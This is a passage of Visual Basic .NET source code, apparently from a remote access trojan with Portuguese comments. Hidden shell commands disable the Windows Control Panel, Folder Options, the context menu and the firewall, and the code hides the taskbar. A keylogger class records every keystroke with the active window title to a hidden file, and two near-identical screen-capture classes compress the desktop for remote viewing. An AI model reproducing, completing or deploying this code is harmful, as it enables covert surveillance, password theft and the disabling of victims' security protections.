                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'DESATIVAR OPÇÕES DE PASTA================================================================================================================================================================================================================================================
        Try
            If ADesativarOpçõesDePasta = "True" Then
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'DESATIVAR MENU CONTEXTO================================================================================================================================================================================================================================================
        Try
            If ADesativarMenuContexto = "True" Then
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
                Shell("REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================

        'DESATIVAR BARRA DE TAREFAS=========================================================================================================================================================================================================================================================
        Try
            If ADesativarBarraDeTarefas = "True" Then
                Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
                SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

        'DESATIVAR FIREWAL=========================================================================================================================================================================================================================================================
        Try
            If ADesativarFirewall = "True" Then
                Shell("netsh.exe firewall set opmode disable", AppWinStyle.Hide)
            End If
        Catch ex As Exception

        End Try
        '============================================================================================================================================================================================================================================================================================================================================

    End Sub

    Public F As Object = New Microsoft.VisualBasic.Devices.Computer

End Class


'CLASS KEYLOGGER
Public Class kl

#Region "API"
    <DllImport("user32.dll")> _
    Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, ByVal dwhkl As IntPtr) As Integer
    End Function
    <DllImport("user32.dll")> _
    Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
    End Function
    <DllImport("user32.dll")> _
    Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
    End Function
    Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Private Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
    Private Declare Function GetForegroundWindow Lib "user32" () As IntPtr
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
#End Region
    Private LastAV As Integer ' Last Active Window Handle
    Private LastAS As String ' Last Active Window Title
    Private lastKey As Keys = Nothing ' Last Pressed Key

    Private Function AV() As String ' Get Active Window
        Try
            Dim o = GetForegroundWindow
            Dim id As Integer
            GetWindowThreadProcessId(o, id)
            Dim p As Object = Process.GetProcessById(id)
            If o.ToInt32 = LastAV And LastAS = p.MainWindowTitle Or p.MainWindowTitle.Length = 0 Then
            Else

                LastAV = o.ToInt32
                LastAS = p.MainWindowTitle
                Return vbNewLine & ChrW(1) & HM() & " " & p.ProcessName & " " & LastAS & ChrW(1) & vbNewLine
            End If
        Catch ex As Exception
        End Try
        Return ""
    End Function
    Public Clock As New Microsoft.VisualBasic.Devices.Clock
    Private Function HM() As String
        Try
            Return Clock.LocalTime.ToString("yy/MM/dd")
        Catch ex As Exception
            Return "??/??/??"
        End Try
    End Function
    Public Logs As String = ""
    Dim keyboard As Object = New Microsoft.VisualBasic.Devices.Keyboard
    Private Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
        Try
            Dim sbString As New System.Text.StringBuilder()
            Dim bKeyState As Byte() = New Byte(254) {}
            Dim bKeyStateStatus As Boolean = GetKeyboardState(bKeyState)
            If Not bKeyStateStatus Then
                Return ""
            End If
            Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
            Dim h As IntPtr = GetForegroundWindow()
            Dim id As Integer = 0
            Dim Aid As Integer = GetWindowThreadProcessId(h, id)
            Dim HKL As IntPtr = GetKeyboardLayout(Aid)
            ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0), _
             HKL)
            Return sbString.ToString()
        Catch ex As Exception
        End Try
        Return CType(VKCode, Keys).ToString
    End Function
    Private Function Fix(ByVal k As Keys) As String
        Dim isuper As Boolean = keyboard.ShiftKeyDown
        If keyboard.CapsLock = True Then
            If isuper = True Then
                isuper = False
            Else
                isuper = True
            End If
        End If
        Try
            Select Case k
                Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
                    Return "[" & k.ToString & "]"
                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt
                    Return ""
                Case Keys.Space
                    Return " "
                Case Keys.Enter, Keys.Return
                    If Logs.EndsWith("[ENTER]" & vbNewLine) Then
                        Return ""
                    End If
                    Return "[ENTER]" & vbNewLine
                Case Keys.Tab
                    Return "[TAP]" & vbNewLine
                Case Else
                    If isuper = True Then
                        Return VKCodeToUnicode(k).ToUpper
                    Else
                        Return VKCodeToUnicode(k)
                    End If
            End Select
        Catch ex As Exception
            If isuper = True Then
                Return ChrW(k).ToString.ToUpper
            Else
                Return ChrW(k).ToString.ToLower
            End If
        End Try
    End Function


    Public LogsPath As String = Reflection.Assembly.GetExecutingAssembly.Location & ".tmp"

    Public Sub WRK()

        Try
            Logs = IO.File.ReadAllText(LogsPath)

        Catch ex As Exception
        End Try

        Try
            Dim lp As Integer = 0
            While True
                lp += 1
                For i As Integer = 0 To 255
                    If GetAsyncKeyState(i) = -32767 Then
                        Dim k As Keys = i
                        Dim s = Fix(k)
                        If s.Length > 0 Then
                            Logs &= AV()
                            Logs &= s
                        End If
                        lastKey = k
                    End If
                Next
                If lp = 1000 Then
                    lp = 0
                    Dim mx As Integer = 20 * 1024
                    If Logs.Length > mx Then
                        Logs = Logs.Remove(0, Logs.Length - mx)
                    End If
                    IO.File.WriteAllText(LogsPath, Logs)
                End If
                Thread.Sleep(1)

            End While

        Catch ex As Exception

        End Try
    End Sub
End Class








'FAS PARTE DO REMOTE DESKTOP==============================================================================================================================

Public Class CRDP
    Private Shared OA As New List(Of Bitmap)
    Private Shared OAA As New List(Of Point)
    Private Shared OM As New Bitmap(1, 1) ' OLD IMAGE
    Private Shared Function QZ(ByVal q As Integer) As Size '  Lower size of image
        Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Select Case q
            Case 0
                Return zs
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
        Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
        Dim B As New Bitmap(W, H)
        Dim g As Graphics = Graphics.FromImage(B)
        g.CompositingQuality = CompositingQuality.HighSpeed
        g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
        If Sh Then
            Try
                Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
            Catch ex As Exception
            End Try
        End If
        g.Dispose()
        If Wi = 0 And He = 0 Then
            Return B
        Else
            Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
        End If
    End Function
    Private Shared Function md5(ByVal bB As Byte()) As String
        Dim md5Obj As New Cryptography.MD5CryptoServiceProvider
        bB = md5Obj.ComputeHash(bB)
        Return Convert.ToBase64String(bB)
    End Function
    Private Shared Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
        Dim j As Integer
        Dim encoders As ImageCodecInfo()
        encoders = ImageCodecInfo.GetImageEncoders()
        For j = 0 To encoders.Length
            If encoders(j).MimeType = M Then
                Return encoders(j)
            End If
        Next j
        Return Nothing
    End Function
    Shared Sub Clear()
        oQ = -1
        oCo = -1
        oQu = -1
        OM = New Bitmap(1, 1)
    End Sub

    Private Shared oQ As Integer = 0
    Private Shared oCo As Integer = 0
    Private Shared oQu As Integer = 0
    Shared Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
ee:
        Dim ZS As New Size(QZ(q))
        ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
        ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
        If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
            OA.Clear()
            OAA.Clear()
            OM = New Bitmap(ZS.Width, ZS.Height)
        End If
        oQ = q
        oCo = co
        oQu = Qu

        Dim A As New List(Of Bitmap)
        Dim AA As New List(Of Point)
        Dim m As Bitmap
        If OA.Count > 0 Then
            A.AddRange(OA.ToArray)
            OA.Clear()
            AA.AddRange(OAA.ToArray)
            OAA.Clear()

            m = OM
            GoTo e
        End If
        m = Gd(ZS.Width, ZS.Height)
        Dim w As Integer = ZS.Width
        Dim h As Integer = ZS.Height
        Dim K As Integer = 0
        For i As Integer = 0 To co - 1
            For ii As Integer = 0 To co - 1
                Dim y As Integer = h / co * i
                Dim x As Integer = w / co * ii
                Dim wc As Integer = w / co
                Dim hc As Integer = h / co
                If wc.ToString.Contains(".") Then
                    wc = Split(wc, ".")(0)
                End If
                If hc.ToString.Contains(".") Then
                    hc = Split(hc, ".")(0)
                End If
                Dim MM As New IO.MemoryStream
                Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim b1 As Byte()
                Dim b2 As Byte()
                Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                b1 = MM.ToArray
                MM.Dispose()
                MM = New IO.MemoryStream
                MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                b2 = MM.ToArray

                MM.Dispose()
                If md5(b1) = md5(b2) Then
                    Mj.Dispose()
                Else
                    A.Add(Mj)
                    AA.Add(New Point(x, y))
                End If
                MJJ.Dispose()
nx:
            Next
        Next
e:

        If A.Count = 0 Then
            Return New Byte() {0}
        End If
        Dim hh As Integer = 0
        Dim QA As New List(Of Integer)
        For i As Integer = 0 To co * co / 5
            If i = A.Count Then Exit For
            QA.Add(i)
            hh += A(i).Height
        Next
        Dim xx As New Bitmap(A(0).Width, hh)
        Dim gg = Graphics.FromImage(xx)
        Dim tp As Integer = 0
        Dim s As String = m.Width & "." & m.Height & ","
        For Each i As Integer In QA
            s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
            gg.DrawImage(A(i), 0, tp)
            tp += A(i).Height
        Next
        s += "njq8"
        For i As Integer = 0 To A.Count - 1
            If QA.Contains(i) = False Then
                OA.Add(A(i))
                OAA.Add(AA(i))
            End If
        Next
        gg.Dispose()
        Dim JA = New IO.MemoryStream
        Dim eps As EncoderParameters = New EncoderParameters(1)
        eps.Param(0) = New EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
        Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
        xx.Save(JA, ici, eps)
        Dim J2 As New IO.MemoryStream
        J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
        J2.Write(JA.ToArray, 0, JA.Length)
        OM = m
        xx.Dispose()
        Return J2.ToArray
    End Function
End Class

Public Class CRDP1
    Private Shared OA As New List(Of Bitmap)
    Private Shared OAA As New List(Of Point)
    Private Shared OM As New Bitmap(1, 1) ' OLD IMAGE
    Private Shared Function QZ(ByVal q As Integer) As Size '  Lower size of image
        Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Select Case q
            Case 0
                Return zs
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
        Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
        Dim B As New Bitmap(W, H)
        Dim g As Graphics = Graphics.FromImage(B)
        g.CompositingQuality = CompositingQuality.HighSpeed
        g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
        If Sh Then
            Try
                Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
            Catch ex As Exception
            End Try
        End If
        g.Dispose()
        If Wi = 0 And He = 0 Then
            Return B
        Else
            Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
        End If
    End Function

    Private Shared Function md5(ByVal bB As Byte()) As String
        Dim md5Obj As New Cryptography.MD5CryptoServiceProvider
        bB = md5Obj.ComputeHash(bB)
        Return Convert.ToBase64String(bB)
    End Function

    Private Shared Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
        Dim j As Integer
        Dim encoders As ImageCodecInfo()
        encoders = ImageCodecInfo.GetImageEncoders()
        For j = 0 To encoders.Length
            If encoders(j).MimeType = M Then
                Return encoders(j)
            End If
        Next j
        Return Nothing
    End Function
    Shared Sub Clear()
        oQ = -1
        oCo = -1
        oQu = -1
        OM = New Bitmap(1, 1)
    End Sub

    Private Shared oQ As Integer = 0
    Private Shared oCo As Integer = 0
    Private Shared oQu As Integer = 0
    Shared Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
ee:
        Dim ZS As New Size(QZ(q))
        ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
        ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
        If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
            OA.Clear()
            OAA.Clear()
            OM = New Bitmap(ZS.Width, ZS.Height)
        End If
        oQ = q
        oCo = co
        oQu = Qu

        Dim A As New List(Of Bitmap)
        Dim AA As New List(Of Point)
        Dim m As Bitmap
        If OA.Count > 0 Then
            A.AddRange(OA.ToArray)
            OA.Clear()
            AA.AddRange(OAA.ToArray)
            OAA.Clear()

            m = OM
            GoTo e
        End If
        m = Gd(ZS.Width, ZS.Height)
        Dim w As Integer = ZS.Width
        Dim h As Integer = ZS.Height
        Dim K As Integer = 0
        For i As Integer = 0 To co - 1
            For ii As Integer = 0 To co - 1
                Dim y As Integer = h / co * i
                Dim x As Integer = w / co * ii
                Dim wc As Integer = w / co
                Dim hc As Integer = h / co
                If wc.ToString.Contains(".") Then
                    wc = Split(wc, ".")(0)
                End If
                If hc.ToString.Contains(".") Then
                    hc = Split(hc, ".")(0)
                End If
                Dim MM As New IO.MemoryStream
                Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                Dim b1 As Byte()
                Dim b2 As Byte()
                Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                b1 = MM.ToArray
                MM.Dispose()
                MM = New IO.MemoryStream
                MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                b2 = MM.ToArray

                MM.Dispose()
                If md5(b1) = md5(b2) Then
                    Mj.Dispose()
                Else
                    A.Add(Mj)
                    AA.Add(New Point(x, y))
                End If
                MJJ.Dispose()
nx:
            Next
        Next
e:

        If A.Count = 0 Then
            Return New Byte() {0}
        End If
        Dim hh As Integer = 0
        Dim QA As New List(Of Integer)
        For i As Integer = 0 To co * co / 5
            If i = A.Count Then Exit For
            QA.Add(i)
            hh += A(i).Height
        Next
        Dim xx As New Bitmap(A(0).Width, hh)
        Dim gg = Graphics.FromImage(xx)
        Dim tp As Integer = 0
        Dim s As String = m.Width & "." & m.Height & ","
        For Each i As Integer In QA
            s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
            gg.DrawImage(A(i), 0, tp)
            tp += A(i).Height
        Next
        s += "njq8"
        For i As Integer = 0 To A.Count - 1
            If QA.Contains(i) = False Then
                OA.Add(A(i))
                OAA.Add(AA(i))
            End If
        Next
        gg.Dispose()
        Dim JA = New IO.MemoryStream
        Dim eps As EncoderParameters = New EncoderParameters(1)
        eps.Param(0) = New EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
        Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
        xx.Save(JA, ici, eps)
        Dim J2 As New IO.MemoryStream
        J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
        J2.Write(JA.ToArray, 0, JA.Length)
        OM = m
        xx.Dispose()
        Return J2.ToArray
    End Function
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)

End Class

'===========================================================================================================================================
'===========================================================================================================================================
